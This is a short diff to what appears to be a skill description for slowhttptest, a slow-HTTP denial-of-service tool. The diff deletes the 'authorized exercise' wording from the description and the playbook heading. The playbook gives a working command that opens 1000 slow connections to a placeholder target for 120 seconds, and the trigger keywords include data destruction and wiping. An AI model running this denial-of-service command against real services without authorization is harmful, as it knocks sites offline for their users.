@@ -1,6 +1,6 @@
 ---
 name: slowhttptest-dos
-description: slowhttptest: 慢速 HTTP 压测(授权演练)。信号:数据破坏,擦除,Slowloris 测试,Range 攻击,持续秒数。
+description: slowhttptest: Web 服务慢速拒绝服务压测。信号:数据破坏,擦除,Slowloris 测试,Range 攻击,持续秒数。
 ---
 
 # slowhttptest
@@ -26,7 +26,7 @@ apt install slowhttptest 或编译
 
 ## 攻击场景 Playbook
 
-### 慢速 HTTP 压测(授权演练)
+### Web 服务慢速拒绝服务压测
 
 ```bash
 slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u https://auth-target.com -l 120
